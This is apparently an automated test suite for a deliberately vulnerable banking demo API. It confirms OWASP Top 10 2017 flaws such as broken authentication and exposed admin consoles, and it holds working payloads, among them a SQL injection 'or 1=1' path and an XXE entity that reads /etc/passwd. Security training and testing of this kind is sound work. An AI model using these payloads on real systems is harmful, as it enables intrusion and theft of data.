var { USERNAME, UNAUTHORIZED_USERNAME, UNAUTHORIZED_ACCOUNT_NUMBER, VALID_PASSWORD, WEAK_PASSWORD_HASH, URL } = require('./common');

var chakram = require('chakram');
var expect = chakram.expect;

describe('Attacks', function() {

  before('Validate system healthcheck', function() {
    return chakram.get(`${URL}/api/v1/health`)
      .then( response => { 
        expect(response).to.have.status(200)
        expect(response).to.comprise.of.json({status:'OK'});
      })
  })

  describe('A1:2017 - SQL Injection', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return chakram.post(`${URL}/api/v1/login`, {id:USERNAME, password:VALID_PASSWORD})
        .then( response => { currentSessionId = response.body.sessionId; return expect(response.body.success).to.be.true})
    })
  
    after('Log out customer to release session', function() {
      return chakram.post(`${URL}/api/v1/logout`, {}, {headers:{sessionid:currentSessionId}})
        .then( response => { return expect(response).to.have.status(200)})
    })

    it('Should list all customers data using SQL injection', function() {
      var response=chakram.get(`${URL}/api/v1/customers/${USERNAME} or 1=1`, {headers:{sessionid:currentSessionId}});
      expect(response).to.have.status(200);
      expect(response).to.have.json( json => {
        expect(json).to.be.array;
        expect(json.length).to.be.equal(4);
        expect(json.map(entry=> {return {id:entry.id}})).to.have.deep.members([{id:2241}, {id:2242}, {id:2243}, {id:2244}]);
      })
      return chakram.wait();
    })
  })

  describe('A2:2017 - Broken Authentication', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return chakram.post(`${URL}/api/v1/login`, {id:USERNAME, password:VALID_PASSWORD})
        .then( response => { currentSessionId = response.body.sessionId; return expect(response.body.success).to.be.true})
    })
  
    it('Logout should not invalidate session', function() {
        return chakram.post(`${URL}/api/v1/logout`, {}, {headers:{sessionid:currentSessionId}})
          .then( () => {
            var response=chakram.get(`${URL}/api/v1/customers/${USERNAME}/accounts`, {headers:{sessionid:currentSessionId}});
            expect(response).to.have.status(200);
            expect(response).to.have.json( json => {
              expect(json).to.be.array;
              expect(json.length).to.be.equal(3);
              expect(json.map(entry=> {return {id:entry.id, iban:entry.iban}})).to.have.deep.members([{id:86433, iban:'PL12 5234 4143 8746 7665'}, {id:86434, iban:'PL13 5127 6900 0411 5593'}, {id:86435, iban:'PL53 5324 1702 1359 0846'}]);
            })
            return chakram.wait();
          })
    })
  })

  describe('A3:2017 - Sensitive Data Exposure', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return chakram.post(`${URL}/api/v1/login`, {id:USERNAME, password:VALID_PASSWORD})
        .then( response => { currentSessionId = response.body.sessionId; return expect(response.body.success).to.be.true})
    })
  
    after('Log out customer to release session', function() {
      return chakram.post(`${URL}/api/v1/logout`, {}, {headers:{sessionid:currentSessionId}})
        .then( response => { return expect(response).to.have.status(200)})
    })

    it('Application should use weak password hashing', function() {
      var response=chakram.get(`${URL}/api/v1/customers/${USERNAME}`, {headers:{sessionid:currentSessionId}});
      expect(response).to.have.status(200);
      expect(response).to.have.json( json => {
        expect(json).to.be.array;
        expect(json.length).to.be.equal(1);
        expect(json[0].password).to.be.equal(WEAK_PASSWORD_HASH);
      })
      return chakram.wait();
    })
  })

  describe('A4:2017 - XML External Entities (XXE)', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return chakram.post(`${URL}/api/v1/login`, {id:USERNAME, password:VALID_PASSWORD})
        .then( response => { currentSessionId = response.body.sessionId; return expect(response.body.success).to.be.true})
    })
  
    after('Log out customer to release session', function() {
      return chakram.post(`${URL}/api/v1/logout`, {}, {headers:{sessionid:currentSessionId}})
        .then( response => { return expect(response).to.have.status(200)})
    })

    it('Should allow XXE to extract /etc/passwd file', function() {
      return chakram.post(`${URL}/api/v1/contacts/${USERNAME}/xml`, {contactsXml:'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY bar SYSTEM "file:///etc/passwd" >]><contacts><contact><name>Business Mike</name><iban>&bar;</iban></contact></contacts>'}, {headers:{sessionid:currentSessionId}})
        .then( result => {
          expect(result).to.have.status(200);
          var response=chakram.get(`${URL}/api/v1/contacts/${USERNAME}`, {headers:{sessionid:currentSessionId}});
          expect(response).to.have.status(200);
          expect(response).to.have.json( json => {
            expect(json).to.be.array;
            expect(json[0].iban).to.match(/node:x:1000:1000::\/home\/node:\/bin\/bash/);
          })
          return chakram.wait();
        })
    })
  })

  describe('A5:2017 - Broken Access Control', function() {

    var currentSessionId;

    before('Log in to obtain valid session id', function() {
      return chakram.post(`${URL}/api/v1/login`, {id:USERNAME, password:VALID_PASSWORD})
        .then( response => { currentSessionId = response.body.sessionId; return expect(response.body.success).to.be.true})
    })
  
    after('Log out customer to release session', function() {
      return chakram.post(`${URL}/api/v1/logout`, {}, {headers:{sessionid:currentSessionId}})
        .then( response => { return expect(response).to.have.status(200)})
    })

    it('Should allow access to customer data when unathorized user is used', function() {
      var response=chakram.get(`${URL}/api/v1/customers/${UNAUTHORIZED_USERNAME}`, {headers:{sessionid:currentSessionId}});
      expect(response).to.have.status(200);
      expect(response).to.have.json( json => {
        expect(json).to.be.array;
        expect(json.length).to.be.equal(1);
        expect(json[0]).to.not.be.null;
        expect(json[0].id).to.be.equal(UNAUTHORIZED_USERNAME);
        expect(json[0].name).to.not.be.null;
        expect(json[0].nationality).to.not.be.null;
        expect(json[0].salt).to.not.be.null;
        expect(json[0].password).to.not.be.null;
      })
      return chakram.wait();
    })

    it('Should allow to create new transaction to unauthorized account', function() {
      var response=chakram.post(`${URL}/api/v1/transactions`, {account_id:UNAUTHORIZED_ACCOUNT_NUMBER, amount:10.49, description:'Test transaction', target_iban:'PL12 3456 7890'} , {headers:{sessionid:currentSessionId}});
      expect(response).to.have.status(200);
      return chakram.wait();
    })
  })

  describe('A6:2017 - Security Misconfiguration', function() {

    it('Should allow access MySQL Adminer Console', function() {
      var response=chakram.get(`${URL}/adminer`);
      expect(response).to.have.status(200);
      return chakram.wait();
    })

    it('Should allow to list CDN directory', function() {
      var response=chakram.get(`${URL}/cdn/`);
      expect(response).to.have.status(200);
      return chakram.wait();
    })

    it('Should allow access to access.php file', function() {
      var response=chakram.get(`${URL}/cdn/access.php`);
      expect(response).to.have.status(200);
      return chakram.wait();
    })
  })
})